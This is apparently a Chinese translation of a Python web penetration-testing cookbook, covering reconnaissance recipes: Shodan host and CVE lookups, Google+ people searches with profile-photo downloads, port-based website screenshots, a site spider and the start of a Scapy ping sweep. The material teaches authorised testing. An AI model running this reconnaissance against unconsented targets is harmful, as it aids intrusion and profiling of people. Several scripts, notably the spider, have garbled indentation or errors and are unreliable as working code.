# Python Web 渗透测试秘籍（一）

> 原文：[`annas-archive.org/md5/9ECC87991CE5C1AD546C7BAEC6960102`](https://annas-archive.org/md5/9ECC87991CE5C1AD546C7BAEC6960102)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 前言

欢迎阅读我们的 Python 和 Web 应用测试书。渗透测试是一个庞大的领域，而 Python 的领域更加广阔。我们希望我们的小书可以帮助您更好地管理这些庞大的领域。如果您是 Python 大师，您可以寻找一些想法，将您的技艺应用于渗透测试，或者如果您是一个有一些渗透测试技能的新手 Python 程序员，那么您很幸运，这本书也适合您。

# 本书涵盖了什么

第一章, *收集开源情报*，涵盖了一系列从免费来源收集信息的配方。

第二章, *枚举*，指导您创建脚本以从网站检索目标信息并验证潜在凭据。

第三章, *漏洞识别*，涵盖了基于识别网站潜在漏洞的配方，如跨站脚本，SQL 注入和过时的插件。

第四章, *SQL 注入*，涵盖了如何创建针对每个人最喜欢的 Web 应用程序漏洞的脚本。

第五章, *Web 标头操作*，涵盖了专门关注在 Web 应用程序上收集，控制和更改标头的脚本。

第六章, *图像分析和操作*，涵盖了旨在识别，逆向和复制图像中的隐写术的配方。

第七章, *加密和编码*，涵盖了涉足加密这一庞大领域的脚本。

第八章, *载荷和 Shell*，涵盖了一小部分概念验证 C2 通道，基本的后渗透脚本和服务器枚举工具。

第九章, *报告*，涵盖了旨在使漏洞报告更加简单和少痛苦的脚本。

# 本书需要什么

您需要一台笔记本电脑，Python 2.7，大多数配方需要互联网连接和良好的幽默感。

# 这本书是为谁准备的

本书适用于寻求快速访问强大的现代工具和可定制脚本，以启动创建自己的 Python Web 渗透测试工具箱的测试人员。

# 章节

在本书中，您将经常看到几个标题（准备就绪，如何做，它是如何工作的，还有更多，另请参阅）。

为了清晰地说明如何完成配方，我们使用以下各节：

## 准备就绪

本节告诉您配方中可以期望什么，并描述了为配方设置任何软件或所需的任何初步设置的方法。

## 如何做…

本节包含了遵循配方所需的步骤。

## 它是如何工作的…

本节通常包括对前一节发生的事情的详细解释。

## 还有更多…

本节包括有关配方的附加信息，以使读者对配方更加了解。

## 另请参阅

本节提供了有关配方的其他有用信息的链接。

# 约定

在本书中，您将找到一些区分不同类型信息的文本样式。以下是这些样式的一些示例及其含义的解释。

文本中的代码词，数据库表名，文件夹名，文件名，文件扩展名，路径名，虚拟 URL，用户输入和 Twitter 句柄显示如下："首先，它向 API 服务器发送 HTTP `GET`请求，然后读取响应并将输出存储到`api_response`变量中。"

代码块设置如下：

```py
import urllib2
import json

GOOGLE_API_KEY = "{Insert your Google API key}"
target = "packtpub.com"
api_response = urllib2.urlopen("https://www.googleapis.com/plus/v1/people? query="+target+"&key="+GOOGLE_API_KEY).read()

json_response = json.loads(api_response)
for result in json_response['items']:
      name = result['displayName']
      print name
      image = result['image']['url'].split('?')[0]
  f = open(name+'.jpg','wb+')
  f.write(urllib2.urlopen(image).read())
  f.close()
```

当我们希望引起您对代码块的特定部分的注意时，相关行或项目将以高亮显示：

```py
a = str((A * int(str(i)+'00') + C) % 2**M)
    if a[-2:] == "47":
```

任何命令行输入或输出都以以下方式编写：

```py
$ pip install plotly
Query failed: ERROR: syntax error at or near

```

**新术语**和**重要单词**以粗体显示。屏幕上显示的单词，例如菜单或对话框中的单词，会以这种方式出现在文本中：“点击**API & auth** | **Credentials**。点击**Create new key**和**Server key**。”

### 注意

警告或重要说明会出现在这样的框中。

### 提示

提示和技巧会以这种方式出现。


# 第一章：收集开源情报

在本章中，我们将涵盖以下主题：

+   使用 Shodan API 收集信息

+   编写 Google+ API 搜索脚本

+   使用 Google+ API 下载个人资料图片

+   使用 Google+ API 分页收集额外结果

+   使用 QtWebKit 获取网站的屏幕截图

+   基于端口列表的屏幕截图

+   爬取网站

# 介绍

**开源情报**（**OSINT**）是从开放（公开）来源收集信息的过程。当涉及测试 Web 应用程序时，这可能看起来很奇怪。然而，在甚至触及网站之前，可以了解到关于特定网站的大量信息。您可能能够找出网站是用什么服务器端语言编写的，底层框架，甚至其凭据。学会使用 API 并编写这些任务可以使收集阶段的大部分工作变得更容易。

在本章中，我们将看一下我们可以使用 Python 利用 API 的几种方式来获得有关目标的洞察力。

# 使用 Shodan API 收集信息

Shodan 本质上是一个漏洞搜索引擎。通过提供名称、IP 地址甚至端口，它返回与其数据库中匹配的所有系统。这使得它成为基础设施情报的最有效来源之一。它就像互联网连接设备的谷歌。Shodan 不断扫描互联网并将结果保存到公共数据库中。虽然可以从 Shodan 网站（[`www.shodan.io`](https://www.shodan.io)）搜索此数据库，但结果和报告的服务是有限的，除非通过**应用程序编程接口**（**API**）访问。

本节的任务是通过使用 Shodan API 获取有关 Packt Publishing 网站的信息。

## 准备工作

在撰写本文时，Shodan 会员费为 49 美元，这是需要获取 API 密钥的。如果您对安全性很认真，访问 Shodan 是非常宝贵的。

如果您还没有 Shodan 的 API 密钥，请访问[www.shodan.io/store/member](http://www.shodan.io/store/member)并注册。Shodan 有一个非常好的 Python 库，也在[`shodan.readthedocs.org/en/latest/`](https://shodan.readthedocs.org/en/latest/)上有很好的文档。

要设置 Python 环境以与 Shodan 一起工作，您只需要使用`cheeseshop`安装库：

```py
$ easy_install shodan

```

## 如何做…

以下是我们将用于此任务的脚本：

```py
import shodan
import requests

SHODAN_API_KEY = "{Insert your Shodan API key}" 
api = shodan.Shodan(SHODAN_API_KEY)

target = 'www.packtpub.com'

dnsResolve = 'https://api.shodan.io/dns/resolve?hostnames=' + target + '&key=' + SHODAN_API_KEY

try:
    # First we need to resolve our targets domain to an IP
    resolved = requests.get(dnsResolve)
    hostIP = resolved.json()[target]

    # Then we need to do a Shodan search on that IP
    host = api.host(hostIP)
    print "IP: %s" % host['ip_str']
    print "Organization: %s" % host.get('org', 'n/a')
    print "Operating System: %s" % host.get('os', 'n/a')

    # Print all banners
    for item in host['data']:
        print "Port: %s" % item['port']
        print "Banner: %s" % item['data']

    # Print vuln information
    for item in host['vulns']:
        CVE = item.replace('!','')
        print 'Vulns: %s' % item
        exploits = api.exploits.search(CVE)
        for item in exploits['matches']:
            if item.get('cve')[0] == CVE:
                print item.get('description')
except:
    'An error occured'
```

上述脚本应该产生类似以下的输出：

```py
IP: 83.166.169.231
Organization: Node4 Limited
Operating System: None

Port: 443
Banner: HTTP/1.0 200 OK

Server: nginx/1.4.5

Date: Thu, 05 Feb 2015 15:29:35 GMT

Content-Type: text/html; charset=utf-8

Transfer-Encoding: chunked

Connection: keep-alive

Expires: Sun, 19 Nov 1978 05:00:00 GMT

Cache-Control: public, s-maxage=172800

Age: 1765

Via: 1.1 varnish

X-Country-Code: US

Port: 80
Banner: HTTP/1.0 301 https://www.packtpub.com/

Location: https://www.packtpub.com/

Accept-Ranges: bytes

Date: Fri, 09 Jan 2015 12:08:05 GMT

Age: 0

Via: 1.1 varnish

Connection: close

X-Country-Code: US

Server: packt

Vulns: !CVE-2014-0160
The (1) TLS and (2) DTLS implementations in OpenSSL 1.0.1 before 1.0.1g do not properly handle Heartbeat Extension packets, which allows remote attackers to obtain sensitive information from process memory via crafted packets that trigger a buffer over-read, as demonstrated by reading private keys, related to d1_both.c and t1_lib.c, aka the Heartbleed bug.

```

我只选择了 Shodan 返回的一些可用数据项，但您可以看到我们得到了相当多的信息。在这种特定情况下，我们可以看到存在潜在的漏洞。我们还看到这台服务器正在端口`80`和`443`上监听，并且根据横幅信息，它似乎正在运行`nginx`作为 HTTP 服务器。

## 工作原理…

1.  首先，在代码中设置我们的静态字符串；这包括我们的 API 密钥：

```py
SHODAN_API_KEY = "{Insert your Shodan API key}" 
target = 'www.packtpub.com'

dnsResolve = 'https://api.shodan.io/dns/resolve?hostnames=' + target + '&key=' + SHODAN_API_KEY
```

1.  下一步是创建我们的 API 对象：

```py
api = shodan.Shodan(SHODAN_API_KEY)
```

1.  为了使用 API 搜索主机的信息，我们需要知道主机的 IP 地址。Shodan 有一个 DNS 解析器，但它没有包含在 Python 库中。要使用 Shodan 的 DNS 解析器，我们只需向 Shodan DNS 解析器 URL 发出 GET 请求，并传递我们感兴趣的域（或域）：

```py
resolved = requests.get(dnsResolve)
hostIP = resolved.json()[target] 
```

1.  返回的 JSON 数据将是一个域到 IP 地址的字典；在我们的情况下，我们只有一个目标，我们可以简单地使用`target`字符串作为字典的键来提取我们主机的 IP 地址。如果您正在搜索多个域，您可能希望遍历此列表以获取所有 IP 地址。

1.  现在，我们有了主机的 IP 地址，我们可以使用 Shodan 库的`host`函数来获取有关我们的主机的信息。返回的 JSON 数据包含大量关于主机的信息，尽管在我们的情况下，我们只会提取 IP 地址、组织，如果可能的话，正在运行的操作系统。然后，我们将循环遍历找到的所有打开端口及其各自的横幅：

```py
    host = api.host(hostIP)
    print "IP: %s" % host['ip_str']
    print "Organization: %s" % host.get('org', 'n/a')
    print "Operating System: %s" % host.get('os', 'n/a')

    # Print all banners
    for item in host['data']:
        print "Port: %s" % item['port']
        print "Banner: %s" % item['data']
```

1.  返回的数据还可能包含 Shodan 认为服务器可能容易受到的**通用漏洞和暴露**（**CVE**）编号。这对我们可能非常有益，因此我们将遍历这些列表（如果有的话），并使用 Shodan 库的另一个函数获取有关利用的信息：

```py
for item in host['vulns']:
        CVE = item.replace('!','')
        print 'Vulns: %s' % item
        exploits = api.exploits.search(CVE)
        for item in exploits['matches']:
            if item.get('cve')[0] == CVE:
                print item.get('description')
```

这就是我们的脚本。尝试针对您自己的服务器运行它。

## 还有更多...

我们只是真正开始了 Shodan Python 库的使用。值得阅读 Shodan API 参考文档，并尝试使用其他搜索选项。您可以根据“facets”筛选结果以缩小搜索范围。您甚至可以使用其他用户使用“tags”搜索保存的搜索。

### 提示

**下载示例代码**

您可以从[`www.packtpub.com`](http://www.packtpub.com)的帐户中下载示例代码文件，以获取您购买的所有 Packt Publishing 图书。如果您在其他地方购买了本书，您可以访问[`www.packtpub.com/support`](http://www.packtpub.com/support)并注册，以便直接通过电子邮件接收文件。

# 编写 Google+ API 搜索脚本

社交媒体是收集有关目标公司或个人信息的好方法。在这里，我们将向您展示如何编写一个 Google+ API 搜索脚本，以在 Google+社交网站中查找公司的联系信息。

## 准备工作

一些 Google API 需要授权才能访问，但是如果您有 Google 帐户，获取 API 密钥很容易。只需转到[`console.developers.google.com`](https://console.developers.google.com)，创建一个新项目。单击**API 和身份验证** | **凭据**。单击**创建新密钥**，然后**服务器密钥**。可选择输入您的 IP，或者只需单击**创建**。您的 API 密钥将显示并准备好复制并粘贴到以下示例中。

## 如何做...

这是一个简单的查询 Google+ API 的脚本：

```py
import urllib2

GOOGLE_API_KEY = "{Insert your Google API key}" 
target = "packtpub.com"
api_response = urllib2.urlopen("https://www.googleapis.com/plus/v1/people? query="+target+"&key="+GOOGLE_API_KEY).read()
api_response = api_response.split("\n")
for line in api_response:
    if "displayName" in line:
        print line
```

## 工作原理...

前面的代码向 Google+搜索 API 发出请求（使用您的 API 密钥进行身份验证），并搜索与目标`packtpub.com`匹配的帐户。与前面的 Shodan 脚本类似，我们设置了静态字符串，包括 API 密钥和目标：

```py
GOOGLE_API_KEY = "{Insert your Google API key}" 
target = "packtpub.com"
```

下一步有两个作用：首先，它向 API 服务器发送 HTTP`GET`请求，然后读取响应并将输出存储到一个`api_response`变量中：

```py
api_response = urllib2.urlopen("https://www.googleapis.com/plus/v1/people? query="+target+"&key="+GOOGLE_API_KEY).read()
```

此请求返回 JSON 格式的响应；这里显示了结果的一个示例片段：

![工作原理...](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-web-pentest-cb/img/B04044_01_01.jpg)

在我们的脚本中，我们将响应转换为列表，以便更容易解析：

```py
api_response = api_response.split("\n")
```

代码的最后一部分循环遍历列表，并仅打印包含`displayName`的行，如下所示：

![工作原理...](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-web-pentest-cb/img/B04044_01_02.jpg)

## 另请参阅...

在下一个示例中，*使用 Google+ API 下载个人资料图片*，我们将看到如何改进这些结果的格式。

## 还有更多...

通过从一个简单的脚本开始查询 Google+ API，我们可以扩展它以提高效率，并利用返回的更多数据。Google+平台的另一个关键方面是用户可能还在 Google 的其他服务上拥有匹配的帐户，这意味着您可以交叉引用帐户。大多数 Google 产品都提供给开发人员的 API，因此一个很好的起点是[`developers.google.com/products/`](https://developers.google.com/products/)。获取 API 密钥并将上一个脚本的输出插入其中。

# 使用 Google+ API 下载个人资料图片

现在我们已经确定了如何使用 Google+ API，我们可以设计一个脚本来下载图片。这里的目标是从网页中获取姓名的照片。我们将通过 URL 向 API 发送请求，通过 JSON 处理响应，并在脚本的工作目录中创建图片文件。

## 如何做到

以下是一个使用 Google+ API 下载个人资料图片的简单脚本：

```py
import urllib2
import json

GOOGLE_API_KEY = "{Insert your Google API key}"
target = "packtpub.com"
api_response = urllib2.urlopen("https://www.googleapis.com/plus/v1/people? query="+target+"&key="+GOOGLE_API_KEY).read()

json_response = json.loads(api_response)
for result in json_response['items']:
      name = result['displayName']
      print name
      image = result['image']['url'].split('?')[0]
  f = open(name+'.jpg','wb+')
  f.write(urllib2.urlopen(image).read())
  f.close()
```

## 它是如何工作的

第一个更改是将显示名称存储到变量中，因为稍后会重复使用它：

```py
      name = result['displayName']
      print name
```

接下来，我们从 JSON 响应中获取图像 URL：

```py
image = result['image']['url'].split('?')[0]
```

代码的最后部分在三行简单的代码中做了很多事情：首先，它在本地磁盘上打开一个文件，文件名设置为`name`变量。这里的`wb+`标志指示操作系统，如果文件不存在，则应创建文件，并以原始二进制格式写入数据。第二行向图像 URL（存储在`image`变量中）发出 HTTP `GET`请求，并将响应写入文件。最后，关闭文件以释放用于存储文件内容的系统内存：

```py
  f = open(name+'.jpg','wb+')
  f.write(urllib2.urlopen(image).read())
  f.close()
```

脚本运行后，控制台输出将与以前相同，显示名称也会显示。但是，您的本地目录现在还将包含所有个人资料图片，保存为 JPEG 文件。

# 使用分页从 Google+ API 中获取额外的结果

默认情况下，Google+ API 返回最多 25 个结果，但我们可以通过增加最大值并通过分页收集更多结果来扩展先前的脚本。与以前一样，我们将通过 URL 和`urllib`库与 Google+ API 进行通信。我们将创建任意数字，随着请求的进行而增加，这样我们就可以跨页面移动并收集更多结果。

## 如何做到

以下脚本显示了如何从 Google+ API 中获取额外的结果：

```py
import urllib2
import json

GOOGLE_API_KEY = "{Insert your Google API key}"
target = "packtpub.com"
token = ""
loops = 0

while loops < 10:
  api_response = urllib2.urlopen("https://www.googleapis.com/plus/v1/people? query="+target+"&key="+GOOGLE_API_KEY+"&maxResults=50& pageToken="+token).read()

  json_response = json.loads(api_response)
  token = json_response['nextPageToken']

  if len(json_response['items']) == 0:
    break

  for result in json_response['items']:
        name = result['displayName']
        print name
        image = result['image']['url'].split('?')[0]
    f = open(name+'.jpg','wb+')
    f.write(urllib2.urlopen(image).read())
  loops+=1
```

## 它是如何工作的

这个脚本中的第一个重大变化是主要代码已经移入了一个`while`循环中：

```py
token = ""
loops = 0

while loops < 10:
```

在这里，循环的次数设置为最多 10 次，以避免向 API 服务器发送过多请求。当然，这个值可以更改为任何正整数。下一个变化是请求 URL 本身；它现在包含了两个额外的尾部参数`maxResults`和`pageToken`。来自 Google+ API 的每个响应都包含一个`pageToken`值，它是指向下一组结果的指针。请注意，如果没有更多结果，仍然会返回一个`pageToken`值。`maxResults`参数是不言自明的，但最多只能增加到 50：

```py
  api_response = urllib2.urlopen("https://www.googleapis.com/plus/v1/people? query="+target+"&key="+GOOGLE_API_KEY+"&maxResults=50& pageToken="+token).read()
```

下一部分在 JSON 响应中读取与以前相同，但这次它还提取了`nextPageToken`的值：

```py
  json_response = json.loads(api_response)
  token = json_response['nextPageToken']
```

主`while`循环如果`loops`变量增加到 10，就会停止，但有时您可能只会得到一页结果。代码中的下一部分检查返回了多少结果；如果没有结果，它会过早地退出循环：

```py
  if len(json_response['items']) == 0:
    break
```

最后，我们确保每次增加`loops`整数的值。一个常见的编码错误是忽略这一点，这意味着循环将永远继续：

```py
  loops+=1
```

# 使用 QtWebKit 获取网站的屏幕截图

他们说一张图片价值千言。有时，在情报收集阶段获取网站的屏幕截图是很有用的。我们可能想要扫描一个 IP 范围，并了解哪些 IP 正在提供网页，更重要的是它们的样子。这可以帮助我们挑选出有趣的网站进行关注，我们也可能想要快速扫描特定 IP 地址上的端口，出于同样的原因。我们将看看如何使用`QtWebKit` Python 库来实现这一点。

## 准备工作

QtWebKit 安装起来有点麻烦。最简单的方法是从[`www.riverbankcomputing.com/software/pyqt/download`](http://www.riverbankcomputing.com/software/pyqt/download)获取二进制文件。对于 Windows 用户，请确保选择适合你的`python/arch`路径的二进制文件。例如，我将使用`PyQt4-4.11.3-gpl-Py2.7-Qt4.8.6-x32.exe`二进制文件在我的安装了 Python 2.7 的 Windows 32 位虚拟机上安装 Qt4。如果你打算从源文件编译 Qt4，请确保你已经安装了`SIP`。

## 如何做…

一旦你安装了 PyQt4，你基本上就可以开始了。下面的脚本是我们将用作截图类的基础：

```py
import sys
import time
from PyQt4.QtCore import *
from PyQt4.QtGui import *
from PyQt4.QtWebKit import *

class Screenshot(QWebView):
    def __init__(self):
        self.app = QApplication(sys.argv)
        QWebView.__init__(self)
        self._loaded = False
        self.loadFinished.connect(self._loadFinished)

    def wait_load(self, delay=0):
        while not self._loaded:
            self.app.processEvents()
            time.sleep(delay)
        self._loaded = False

    def _loadFinished(self, result):
        self._loaded = True

    def get_image(self, url):
        self.load(QUrl(url))
        self.wait_load()

        frame = self.page().mainFrame()
        self.page().setViewportSize(frame.contentsSize())

        image = QImage(self.page().viewportSize(), QImage.Format_ARGB32)
        painter = QPainter(image)
        frame.render(painter)
        painter.end()
        return image
```

创建前面的脚本并将其保存在 Python 的`Lib`文件夹中。然后我们可以在我们的脚本中将其作为导入引用。

## 工作原理…

该脚本利用`QWebView`加载 URL，然后使用 QPainter 创建图像。`get_image`函数接受一个参数：我们的目标。有了这个，我们可以简单地将其导入到另一个脚本中并扩展功能。

让我们分解脚本，看看它是如何工作的。

首先，我们设置我们的导入：

```py
import sys
import time
from PyQt4.QtCore import *
from PyQt4.QtGui import *
from PyQt4.QtWebKit import *
```

然后，我们创建我们的类定义；我们正在创建的类通过继承从`QWebView`继承：

```py
class Screenshot(QWebView):
```

接下来，我们创建我们的初始化方法：

```py
def __init__(self):
        self.app = QApplication(sys.argv)
        QWebView.__init__(self)
        self._loaded = False
        self.loadFinished.connect(self._loadFinished)

def wait_load(self, delay=0):
        while not self._loaded:
            self.app.processEvents()
            time.sleep(delay)
        self._loaded = False

def _loadFinished(self, result):
        self._loaded = True
```

初始化方法设置了`self.__loaded`属性。这与`__loadFinished`和`wait_load`函数一起用于检查应用程序运行时的状态。它会等到站点加载完成后再截图。实际的截图代码包含在`get_image`函数中：

```py
def get_image(self, url):
        self.load(QUrl(url))
        self.wait_load()

        frame = self.page().mainFrame()
        self.page().setViewportSize(frame.contentsSize())

        image = QImage(self.page().viewportSize(), QImage.Format_ARGB32)
        painter = QPainter(image)
        frame.render(painter)
        painter.end()
        return image
```

在这个`get_image`函数中，我们将视口的大小设置为主框架中内容的大小。然后设置图像格式，将图像分配给绘图对象，然后使用绘图器渲染框架。最后，我们返回处理过的图像。

## 还有更多…

要使用我们刚刚创建的类，我们只需将其导入到另一个脚本中。例如，如果我们只想保存我们收到的图像，我们可以做如下操作：

```py
import screenshot
s = screenshot.Screenshot()
image = s.get_image('http://www.packtpub.com')
image.save('website.png')
```

就是这样。在下一个脚本中，我们将创建一些更有用的东西。

# 基于端口列表的截图

在上一个脚本中，我们创建了一个基本函数来返回 URL 的图像。现在我们将扩展该功能，循环遍历与基于 Web 的管理门户常见相关的端口列表。这将允许我们将脚本指向一个 IP，并自动运行可能与 Web 服务器相关的可能端口。这是用于在我们不知道服务器上开放了哪些端口的情况下使用，而不是在我们指定端口和域时使用。

## 准备工作

为了使这个脚本工作，我们需要在*使用 QtWeb Kit 获取网站截图*配方中创建脚本。这应该保存在`Pythonxx/Lib`文件夹中，并命名为清晰和易记的名称。在这里，我们将该脚本命名为`screenshot.py`。你的脚本的命名特别重要，因为我们会用一个重要的声明引用它。

## 如何做…

这是我们将要使用的脚本：

```py
import screenshot
import requests

portList = [80,443,2082,2083,2086,2087,2095,2096,8080,8880,8443,9998,4643, 9001,4489]

IP = '127.0.0.1'

http = 'http://'
https = 'https://'

def testAndSave(protocol, portNumber):
    url = protocol + IP + ':' + str(portNumber)
    try:
        r = requests.get(url,timeout=1)

        if r.status_code == 200:
            print 'Found site on ' + url 
            s = screenshot.Screenshot()
            image = s.get_image(url)
            image.save(str(portNumber) + '.png')
    except:
        pass

for port in portList:
    testAndSave(http, port)
    testAndSave(https, port)
```

## 工作原理…

我们首先创建我们的导入声明。在这个脚本中，我们使用了之前创建的`screenshot`脚本，还有`requests`库。`requests`库用于我们在尝试将其转换为图像之前检查请求的状态。我们不想浪费时间尝试转换不存在的站点。

接下来，我们导入我们的库：

```py
import screenshot
import requests
```

下一步是设置我们将要迭代的常见端口号数组。我们还设置了一个包含我们将要使用的 IP 地址的字符串：

```py
portList = [80,443,2082,2083,2086,2087,2095,2096,8080,8880,8443,9998,4643, 9001,4489]

IP = '127.0.0.1'
```

接下来，我们创建字符串来保存我们稍后将构建的 URL 的协议部分；这只是为了稍后的代码更加整洁：

```py
http = 'http://'
https = 'https://'
```

接下来，我们创建我们的方法，它将负责构建 URL 字符串的工作。创建 URL 后，我们检查我们的`get`请求是否返回`200`响应代码。如果请求成功，我们将返回的网页转换为图像，并以成功的端口号作为文件名保存。代码包裹在`try`块中，因为如果我们发出请求时网站不存在，它将抛出一个错误：

```py
def testAndSave(protocol, portNumber):
    url = protocol + IP + ':' + str(portNumber)
    try:
        r = requests.get(url,timeout=1)

        if r.status_code == 200:
            print 'Found site on ' + url 
            s = screenshot.Screenshot()
            image = s.get_image(url)
            image.save(str(portNumber) + '.png')
    except:
        pass
```

现在我们的方法已经准备好了，我们只需遍历端口列表中的每个端口，并调用我们的方法。我们先对 HTTP 协议进行一次，然后对 HTTPS 进行一次：

```py
for port in portList:
    testAndSave(http, port)
    testAndSave(https, port)
```

就是这样。只需运行脚本，它就会将图像保存在与脚本相同的位置。

## 还有更多...

你可能会注意到脚本运行起来需要一些时间。这是因为它必须依次检查每个端口。实际上，你可能希望将这个脚本改成多线程脚本，这样它就可以同时检查多个 URL。让我们快速看一下如何修改代码来实现这一点。

首先，我们需要几个额外的导入声明：

```py
import Queue
import threading
```

接下来，我们需要创建一个名为`threader`的新函数。这个新函数将处理将我们的`testAndSave`函数放入队列中：

```py
def threader(q, port):
    q.put(testAndSave(http, port))
    q.put(testAndSave(https, port))
```

现在我们有了新的函数，我们只需要设置一个新的`Queue`对象，并进行一些线程调用。我们将从我们对`portList`变量的`FOR`循环中取出`testAndSave`调用，并用这段代码替换它：

```py
q = Queue.Queue()

for port in portList:
    t = threading.Thread(target=threader, args=(q, port))
    t.deamon = True
    t.start()

s = q.get()
```

因此，我们的新脚本现在总共看起来是这样的：

```py
import Queue
import threading
import screenshot
import requests

portList = [80,443,2082,2083,2086,2087,2095,2096,8080,8880,8443,9998,4643, 9001,4489]

IP = '127.0.0.1'

http = 'http://'
https = 'https://'

def testAndSave(protocol, portNumber):
    url = protocol + IP + ':' + str(portNumber)
    try:
        r = requests.get(url,timeout=1)

        if r.status_code == 200:
            print 'Found site on ' + url 
            s = screenshot.Screenshot()
            image = s.get_image(url)
            image.save(str(portNumber) + '.png')
    except:
        pass

def threader(q, port):
    q.put(testAndSave(http, port))
    q.put(testAndSave(https, port))

q = Queue.Queue()

for port in portList:
    t = threading.Thread(target=threader, args=(q, port))
    t.deamon = True
    t.start()

s = q.get()
```

如果我们现在运行这个脚本，我们将更快地执行我们的代码，因为 Web 请求现在是并行执行的。

你可以尝试进一步扩展脚本，使其适用于一系列 IP 地址；当你测试内部网络范围时，这可能会很方便。

# 爬取网站

许多工具提供了绘制网站地图的功能，但通常你只能限制输出样式或提供结果的位置。这个爬虫脚本的基础版本允许你快速绘制网站地图，并且可以根据需要进行修改。

## 准备工作

为了使这个脚本工作，你需要`BeautifulSoup`库，可以通过`apt`命令安装，使用`apt-get install python-bs4`，或者使用`pip install beautifulsoup4`。就是这么简单。

## 如何做...

这是我们将要使用的脚本：

```py
import urllib2 
from bs4 import BeautifulSoup
import sys
urls = []
urls2 = []

tarurl = sys.argv[1] 

url = urllib2.urlopen(tarurl).read()
soup = BeautifulSoup(url)
for line in soup.find_all('a'):
    newline = line.get('href')
    try: 
        if newline[:4] == "http": 
            if tarurl in newline: 
            urls.append(str(newline)) 
        elif newline[:1] == "/": 
            combline = tarurl+newline urls.append(str(combline)) except: 
               pass

    for uurl in urls: 
        url = urllib2.urlopen(uurl).read() 
        soup = BeautifulSoup(url) 
        for line in soup.find_all('a'): 
            newline = line.get('href') 
            try: 
                if newline[:4] == "http": 
                    if tarurl in newline:
                        urls2.append(str(newline)) 
                elif newline[:1] == "/": 
                    combline = tarurl+newline 
                    urls2.append(str(combline)) 
                    except: 
                pass 
            urls3 = set(urls2) 
    for value in urls3: 
    print value
```

## 它是如何工作的...

首先导入必要的库，并创建两个名为`urls`和`urls2`的空列表。这将允许我们对爬虫过程进行两次运行。接下来，我们设置输入，作为脚本的附录添加到命令行中运行。它将运行如下：

```py
$ python spider.py http://www.packtpub.com

```

然后，我们打开提供的`url`变量，并将其传递给`beautifulsoup`工具：

```py
url = urllib2.urlopen(tarurl).read() 
soup = BeautifulSoup(url) 
```

`beautifulsoup`工具将内容分成部分，并允许我们只提取我们想要的部分：

```py
for line in soup.find_all('a'): 
newline = line.get('href') 
```

然后，我们提取在 HTML 中标记为标签的所有内容，并抓取标记指定为`href`的元素。这允许我们抓取页面中列出的所有 URL。

接下来的部分处理相对链接和绝对链接。如果一个链接是相对的，它以斜杠开头，表示它是一个托管在 Web 服务器本地的页面。如果一个链接是绝对的，它包含完整的地址，包括域名。我们在下面的代码中所做的是确保我们作为外部用户可以打开我们找到的所有链接并将它们列为绝对链接：

```py
if newline[:4] == "http": 
if tarurl in newline: 
urls.append(str(newline)) 
  elif newline[:1] == "/": 
combline = tarurl+newline urls.append(str(combline))
```

然后，我们再次使用从该页面识别出的`urls`列表重复这个过程，通过遍历原始`url`列表中的每个元素：

```py
for uurl in urls:
```

除了引用列表和变量的更改，代码保持不变。

我们合并这两个列表，最后，为了方便输出，我们将`urls`列表的完整列表转换为一个集合。这将从列表中删除重复项，并允许我们整齐地输出它。我们遍历集合中的值，并逐个输出它们。

## 还有更多...

这个工具可以与本书中早期和后期展示的任何功能相结合。它可以与*使用 QtWeb Kit 获取网站截图*结合，允许您对每个页面进行截图。您可以将其与第二章中的电子邮件地址查找器*枚举*结合，从每个页面获取电子邮件地址，或者您可以找到另一种用途来映射网页的简单技术。

该脚本可以很容易地更改，以添加深度级别，从当前的 2 个链接深度到系统参数设置的任何值。输出可以更改以添加每个页面上存在的 URL，或将其转换为 CSV，以便您可以将漏洞映射到页面进行简单的注释。


# 第二章：枚举

在本章中，我们将涵盖以下主题：

+   使用 Scapy 执行 ping 扫描

+   使用 Scapy 进行扫描

+   检查用户名的有效性

+   暴力破解用户名

+   枚举文件

+   暴力破解密码

+   从姓名生成电子邮件地址

+   从网页中查找电子邮件地址

+   在源代码中查找注释

# 介绍

当你确定了要测试的目标后，你会想要进行一些枚举。这将帮助你确定一些进一步侦察或攻击的潜在路径。这是一个重要的步骤。毕竟，如果你想从保险柜里偷东西，你首先会看一下，确定你是否需要密码、钥匙或组合，而不是简单地绑上一根炸药棒，可能摧毁内容。

在本章中，我们将看一些你可以使用 Python 执行主动枚举的方法。

# 使用 Scapy 执行 ping 扫描

当你确定了目标网络后，要执行的第一个任务之一是检查哪些主机是活动的。实现这一目标的一个简单方法是 ping 一个 IP 地址，并确认是否收到回复。然而，对于超过几个主机来说，这样做很快就会变成一项繁重的任务。这个教程旨在向你展示如何使用 Scapy 实现这一目标。

Scapy 是一个强大的工具，可以用来操纵网络数据包。虽然我们不会深入探讨 Scapy 可以完成的所有功能，但在这个教程中，我们将使用它来确定哪些主机会回复**Internet 控制消息协议**（**ICMP**）数据包。虽然你可能可以创建一个简单的 bash 脚本，并将其与一些 grep 过滤器结合起来，但这个教程旨在向你展示在涉及迭代 IP 范围的任务中会有用的技术，以及基本 Scapy 用法的示例。

Scapy 可以通过以下命令安装在大多数 Linux 系统上：

```py
$ sudo apt-get install python-scapy

```

## 如何做…

以下脚本显示了如何使用 Scapy 创建 ICMP 数据包并在收到响应时处理它：

```py
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

import sys 
from scapy.all import *

if len(sys.argv) !=3:
    print "usage: %s start_ip_addr end_ip_addr" % (sys.argv[0])
    sys.exit(0)

livehosts=[]
#IP address validation
ipregex=re.compile("^([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0- 9]|25[0-5])\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0- 5])\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\.([0- 9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])$")

if (ipregex.match(sys.argv[1]) is None):
  print "Starting IP address is invalid"
  sys.exit(0)
if (ipregex.match(sys.argv[1]) is None):
  print "End IP address is invalid"
  sys.exit(0)

iplist1 = sys.argv[1].split(".")
iplist2 = sys.argv[2].split(".")

if not (iplist1[0]==iplist2[0] and iplist1[1]==iplist2[1] and iplist1[2]==iplist2[2])
  print "IP addresses are not in the same class C subnet"
  sys.exit(0)	

if iplist1[3]>iplist2[3]:
  print "Starting IP address is greater than ending IP address"
  sys.exit(0)

